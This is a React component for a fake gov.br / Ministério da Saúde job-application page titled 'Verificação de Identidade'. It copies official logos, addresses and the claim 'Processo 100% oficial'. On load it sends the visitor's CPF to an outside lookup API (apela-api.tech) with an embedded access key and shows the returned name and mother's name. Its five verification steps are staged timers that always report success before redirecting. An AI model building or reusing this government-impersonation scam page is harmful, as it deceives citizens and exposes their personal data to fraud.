import React, { useState, useEffect } from 'react';
import { 
  ArrowLeft, 
  ArrowRight, 
  Info,
  CheckCircle,
  Loader2,
  Shield
} from 'lucide-react';

interface CpfData {
  cpf: string;
  nome: string;
  mae: string;
  nascimento: string;
  sexo: string;
}

interface VerificationPageProps {
  selectedJob: {
    id: string;
    title: string;
    salary: string;
  } | null;
  cepData: {
    cep: string;
    logradouro: string;
    bairro: string;
    localidade: string;
    uf: string;
    ibge: string;
  } | null;
  cpfData: string;
  onContinue: () => void;
}

interface VerificationStep {
  id: string;
  label: string;
  status: 'completed' | 'loading' | 'pending';
  message: string;
}

const VerificationPage: React.FC<VerificationPageProps> = ({ selectedJob, cepData, cpfData, onContinue }) => {
  const [verificationSteps, setVerificationSteps] = useState<VerificationStep[]>([
    {
      id: 'cpf',
      label: 'CPF',
      status: 'loading',
      message: 'Verificando CPF...'
    },
    {
      id: 'nome',
      label: 'Nome Completo',
      status: 'pending',
      message: 'Aguardando...'
    },
    {
      id: 'mae',
      label: 'Nome da Mãe',
      status: 'pending',
      message: 'Aguardando...'
    },
    {
      id: 'nascimento',
      label: 'Data de Nascimento',
      status: 'pending',
      message: 'Aguardando...'
    },
    {
      id: 'elegibilidade',
      label: 'Elegibilidade',
      status: 'pending',
      message: 'Aguardando...'
    }
  ]);

  const [allCompleted, setAllCompleted] = useState(false);
  const [userCpfData, setUserCpfData] = useState<CpfData | null>(null);

  const updateHeaderLoginButton = (userName: string) => {
    // Função para atualizar o botão de login no header
    if (typeof window !== 'undefined' && (window as any).updateHeaderLoginButton) {
      (window as any).updateHeaderLoginButton(userName);
    }
  };

  const fetchCpfData = async (cleanCpf: string) => {
    try {
      const response = await fetch(`https://apela-api.tech/?user=b1b0e7e6-3bd8-4aae-bcb0-2c03940c3ae9&cpf=${cleanCpf}`);
      const data = await response.json();
      
      if (data.status === 200 && data.nome) {
        const formattedData = {
          cpf: data.cpf || cleanCpf,
          nome: data.nome,
          mae: data.mae || 'Não informado',
          nascimento: data.nascimento,
          sexo: data.sexo
        };
        setUserCpfData(formattedData);
        // Atualizar o botão de login no header com o nome do usuário
        updateHeaderLoginButton(data.nome);
        return formattedData;
      }
    } catch (error) {
      console.error('Erro ao buscar dados do CPF:', error);
    }
    return null;
  };

  useEffect(() => {
    // Buscar dados do CPF quando a página carregar
    if (cpfData) {
      const cleanCpf = cpfData.replace(/\D/g, '');
      fetchCpfData(cleanCpf);
    }

    // Simular processo de verificação com 2 segundos para cada etapa
    const timer1 = setTimeout(() => {
      setVerificationSteps(prev => prev.map(step => 
        step.id === 'cpf' 
          ? { ...step, status: 'completed', message: 'CPF validado com sucesso' }
          : step.id === 'nome'
          ? { ...step, status: 'loading', message: 'Verificando Nome Completo...' }
          : step
      ));
    }, 2000);

    const timer2 = setTimeout(() => {
      setVerificationSteps(prev => prev.map(step => 
        step.id === 'nome' 
          ? { ...step, status: 'completed', message: 'Nome Completo validado com sucesso' }
          : step.id === 'mae'
          ? { ...step, status: 'loading', message: 'Verificando Nome da Mãe...' }
          : step
      ));
    }, 4000);

    const timer3 = setTimeout(() => {
      setVerificationSteps(prev => prev.map(step => 
        step.id === 'mae' 
          ? { ...step, status: 'completed', message: 'Nome da Mãe validado com sucesso' }
          : step.id === 'nascimento'
          ? { ...step, status: 'loading', message: 'Verificando Data de Nascimento...' }
          : step
      ));
    }, 6000);

    const timer4 = setTimeout(() => {
      setVerificationSteps(prev => prev.map(step => 
        step.id === 'nascimento' 
          ? { ...step, status: 'completed', message: 'Data de Nascimento validada com sucesso' }
          : step.id === 'elegibilidade'
          ? { ...step, status: 'loading', message: 'Verificando Elegibilidade...' }
          : step
      ));
    }, 8000);

    const timer5 = setTimeout(() => {
      setVerificationSteps(prev => prev.map(step => 
        step.id === 'elegibilidade' 
          ? { ...step, status: 'completed', message: 'Elegibilidade confirmada com sucesso' }
          : step
      ));
      setAllCompleted(true);
    }, 10000);

    // Auto-redirect após todas as verificações (2 segundos após completar)
    const timer6 = setTimeout(() => {
      onContinue();
    }, 12000);

    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      clearTimeout(timer4);
      clearTimeout(timer5);
      clearTimeout(timer6);
    };
  }, [onContinue, cpfData]);

  const handleBack = () => {
    window.history.back();
  };

  const renderStepIcon = (status: string) => {
    switch (status) {
      case 'completed':
        return (
          <div className="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center">
            <CheckCircle className="w-4 h-4 text-white" />
          </div>
        );
      case 'loading':
        return <Loader2 className="w-5 h-5 text-green-600 animate-spin" />;
      case 'pending':
      default:
        return <div className="w-6 h-6 bg-gray-300 rounded-full"></div>;
    }
  };

  const getMessageColor = (status: string) => {
    switch (status) {
      case 'completed':
        return 'text-green-600';
      case 'loading':
        return 'text-green-600';
      case 'pending':
      default:
        return 'text-gray-500';
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      {/* Header */}
      <header className="bg-white shadow-sm relative">
        <div className="flex justify-between items-center px-4 py-3 border-b border-gray-200">
          <div className="flex items-center">
            <button className="flex items-center hover:opacity-80 transition-opacity bg-transparent border-none p-0">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" 
                alt="gov.br" 
                className="h-8"
              />
            </button>
          </div>
          
          <div className="flex items-center space-x-4">
            <button className="text-blue-900 hover:text-blue-700 transition-colors relative" aria-label="Menu">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <circle cx="12" cy="12" r="1"></circle>
                <circle cx="12" cy="5" r="1"></circle>
                <circle cx="12" cy="19" r="1"></circle>
              </svg>
            </button>
            <div className="w-px h-6 bg-blue-900"></div>
            <button 
              className="text-blue-900 hover:text-blue-700 transition-colors" 
              aria-label="Acessibilidade" 
              title="Alternar modo de alto contraste"
            >
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <circle cx="13.5" cy="6.5" r=".5" fill="currentColor"></circle>
                <circle cx="17.5" cy="10.5" r=".5" fill="currentColor"></circle>
                <circle cx="8.5" cy="7.5" r=".5" fill="currentColor"></circle>
                <circle cx="6.5" cy="12.5" r=".5" fill="currentColor"></circle>
                <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10c.926 0 1.648-.746 1.648-1.688 0-.437-.18-.835-.437-1.125-.29-.289-.438-.652-.438-1.125a1.64 1.64 0 0 1 1.668-1.668h1.996c3.051 0 5.555-2.503 5.555-5.554C21.965 6.012 17.461 2 12 2z"></path>
              </svg>
            </button>
        
            <button className="text-blue-900 hover:text-blue-700 transition-colors relative" aria-label="Aplicativos">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <rect width="18" height="18" x="3" y="3" rx="2"></rect>
                <path d="M3 9h18"></path>
                <path d="M3 15h18"></path>
                <path d="M9 3v18"></path>
                <path d="M15 3v18"></path>
              </svg>
            </button>
            <button id="login-button" className="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium border-none">
              <span id="login-text">
                {userCpfData ? userCpfData.nome.split(' ')[0] : 'Login'}
              </span>
            </button>
          </div>
        </div>
        
        <div className="flex justify-between items-center px-4 py-2 bg-gray-50">
          <div className="flex items-center">
            <button className="text-blue-900 hover:text-blue-700 transition-colors mr-3" aria-label="Menu lateral">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <line x1="4" x2="20" y1="12" y2="12"></line>
                <line x1="4" x2="20" y1="6" y2="6"></line>
                <line x1="4" x2="20" y1="18" y2="18"></line>
              </svg>
            </button>
            <span className="text-gray-800 text-sm font-medium">Ministério da Saúde</span>
          </div>
          
          <div className="flex items-center space-x-3">
            <button 
              className="text-blue-900 hover:text-blue-700 transition-colors" 
              aria-label="Busca por voz" 
              title="Busca por voz"
            >
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"></path>
                <path d="M19 10v2a7 7 0 0 1-14 0v-2"></path>
                <line x1="12" x2="12" y1="19" y2="22"></line>
              </svg>
            </button>
            <button className="text-blue-900 hover:text-blue-700 transition-colors" aria-label="Pesquisar">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <circle cx="11" cy="11" r="8"></circle>
                <path d="m21 21-4.3-4.3"></path>
              </svg>
            </button>
          </div>
        </div>
      </header>

      {/* Breadcrumb */}
      <nav className="bg-white border-b border-gray-200 px-4 py-3" aria-label="Navegação estrutural">
        <div className="flex flex-wrap items-center gap-1 text-sm">
          <button 
            onClick={handleBack}
            className="text-blue-700 hover:text-blue-800 transition-colors text-xs flex items-center bg-transparent border-none p-0"
          >
            <ArrowLeft className="w-3 h-3" />
          </button>
          <span className="mx-1 text-gray-600">{'>'}</span>
          <button 
            onClick={handleBack}
            className="text-blue-700 hover:text-blue-800 transition-colors text-xs bg-transparent border-none p-0"
          >
            Busca de Vagas
          </button>
          <span className="mx-1 text-gray-600">{'>'}</span>
          <span className="text-gray-800 text-xs font-medium">Verificação de Identidade</span>
        </div>
      </nav>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-4 py-8">
        <h1 className="text-3xl font-semibold mb-4 text-green-800">Formulário de Inscrição</h1>
        
        <div className="border-t border-b border-gray-300 py-3 mb-6">
          <div className="text-gray-700 text-sm space-y-1">
            <p>Publicado em 15/01/2025 14h30</p>
            <p>Atualizado em 15/01/2025 16h45</p>
          </div>
        </div>

        {/* Progress Bar */}
        <div className="bg-white border border-gray-200 rounded-lg p-4 md:p-6 mb-6 md:mb-8">
          <h2 className="text-base md:text-lg font-semibold text-gray-800 mb-3 md:mb-4">Progresso da Inscrição</h2>
          
          {/* Desktop Progress */}
          <div className="hidden md:flex items-center justify-between">
            <div className="flex items-center">
              <div className="w-7 h-7 bg-green-600 text-white rounded-full flex items-center justify-center text-xs font-medium">1</div>
              <span className="ml-2 text-sm font-medium text-green-600">Dados Pessoais</span>
            </div>
            <div className="flex-1 mx-3 h-1 bg-gray-200 rounded">
              <div className="h-1 bg-green-600 rounded transition-all duration-500" style={{ width: '100%' }}></div>
            </div>
            <div className="flex items-center">
              <div className="w-7 h-7 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center text-xs font-medium">2</div>
              <span className="ml-2 text-sm text-gray-600">Documentação</span>
            </div>
            <div className="flex-1 mx-3 h-1 bg-gray-200 rounded">
              <div className="h-1 bg-green-600 rounded transition-all duration-500" style={{ width: '0%' }}></div>
            </div>
            <div className="flex items-center">
              <div className="w-7 h-7 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center text-xs font-medium">3</div>
              <span className="ml-2 text-sm text-gray-600">Finalização</span>
            </div>
          </div>

          {/* Mobile Progress */}
          <div className="md:hidden">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs text-gray-600">Etapa 1 de 3</span>
              <span className="text-xs font-medium text-green-600">33% concluído</span>
            </div>
            <div className="w-full bg-gray-200 rounded-full h-2 mb-3">
              <div className="bg-green-600 h-2 rounded-full" style={{ width: '33%' }}></div>
            </div>
            <div className="flex justify-between text-xs">
              <span className="font-medium text-green-600">• Dados Pessoais</span>
              <span className="text-gray-500">Documentação</span>
              <span className="text-gray-500">Finalização</span>
            </div>
          </div>
        </div>

        {/* Info Box */}
        <div className="bg-gray-50 border border-gray-300 rounded p-3 mb-4">
          <div className="flex items-center">
            <Info className="text-gray-600 text-sm mr-2 w-4 h-4" />
            <h3 className="text-sm font-medium text-gray-700">Informações Importantes</h3>
          </div>
          <p className="text-xs text-gray-600 mt-1 ml-6">
            Tenha documentos em mãos • Verifique dados antes de prosseguir • Processo 100% oficial
          </p>
        </div>

        {/* User Info Display */}
        {userCpfData && (
          <div className="bg-green-50 border border-green-200 rounded-lg p-6 mb-6">
            <h3 className="text-lg font-semibold text-green-800 mb-4 flex items-center">
              <CheckCircle className="w-5 h-5 text-green-600 mr-2" />
              Usuário Identificado
            </h3>
            <div className="grid md:grid-cols-2 gap-4">
              <div className="bg-white p-4 rounded-lg border border-green-200">
                <label className="text-xs font-medium text-gray-500 uppercase tracking-wide">Nome Completo</label>
                <p className="font-semibold text-gray-900 mt-1">{userCpfData.nome}</p>
              </div>
              <div className="bg-white p-4 rounded-lg border border-green-200">
                <label className="text-xs font-medium text-gray-500 uppercase tracking-wide">CPF</label>
                <p className="font-mono font-semibold text-gray-900 mt-1">{cpfData}</p>
              </div>
            </div>
          </div>
        )}

        {/* Verification Section */}
        <div className="bg-white border border-gray-200 rounded-lg p-6 mb-8">
          <h3 className="text-xl font-semibold text-gray-800 mb-6 flex items-center">
            <Shield className="mr-2 w-5 h-5" />
            Verificação de Identidade
          </h3>

          <div className="space-y-3">
            {verificationSteps.map((step) => (
              <div key={step.id} className="flex items-center p-3 bg-gray-100 rounded-lg">
                <div className="flex-shrink-0 mr-3 w-6 h-6 flex items-center justify-center">
                  {renderStepIcon(step.status)}
                </div>
                <div className="flex-1">
                  <h4 className="font-medium text-gray-700 text-sm">{step.label}</h4>
                  <p className={`text-xs ${getMessageColor(step.status)}`}>{step.message}</p>
                </div>
              </div>
            ))}
          </div>

          {allCompleted && (
            <div className="mt-6 p-4 bg-green-50 border border-green-200 rounded-lg">
              <div className="flex items-center justify-center">
                <CheckCircle className="w-6 h-6 text-green-600 mr-2" />
                <span className="text-green-800 font-medium">Todas as verificações foram concluídas com sucesso!</span>
              </div>
              <p className="text-center text-green-700 text-sm mt-2">
                Redirecionando automaticamente para a próxima etapa...
              </p>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-slate-900 text-white">
        <div className="container mx-auto px-6 py-8">
          <div className="py-6">
            <a 
              href="https://www.gov.br"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-block hover:opacity-80 transition-opacity"
            >
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png"
                alt="Government of Brazil logo"
                className="w-40 brightness-0 invert"
              />
            </a>
          </div>

          <div className="border-t border-gray-600"></div>

          <nav aria-label="Menu principal do rodapé" className="mt-6">
            <ul>
              <li className="">
                <div className="py-3">
                  <div className="flex justify-between items-center">
                    <a
                      href="https://www.gov.br/sus/pt-br"
                      className="text-sm hover:text-gray-300 transition-colors flex items-center"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      SUS
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-3 h-3 ml-1">
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14 21 3"></path>
                        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                      </svg>
                    </a>
                  </div>
                </div>
              </li>
            </ul>
          </nav>

          <div className="mt-8 pt-6 border-t border-gray-600">
            <div className="grid md:grid-cols-2 gap-4 text-xs text-gray-400">
              <div>
                <p className="mb-2">
                  <strong>Ministério da Educação</strong><br />
                  Esplanada dos Ministérios, Bloco L<br />
                  CEP: 70047-900 - Brasília/DF
                </p>
                <p>
                  <strong>Central de Atendimento:</strong>{' '}
                  <a href="tel:08007616161" className="hover:text-white transition-colors">
                    0800 761 6161
                  </a>
                </p>
              </div>
              <div className="text-right">
                <p className="mb-2">
                  <a
                    href="https://www.gov.br/pt-br/termos-de-uso"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:text-white transition-colors"
                  >
                    Termos de Uso
                  </a>{' '}
                  |{' '}
                  <a
                    href="https://www.gov.br/pt-br/politica-de-privacidade"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:text-white transition-colors"
                  >
                    Política de Privacidade
                  </a>
                </p>
                <p>© 2025 Governo Federal do Brasil</p>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default VerificationPage;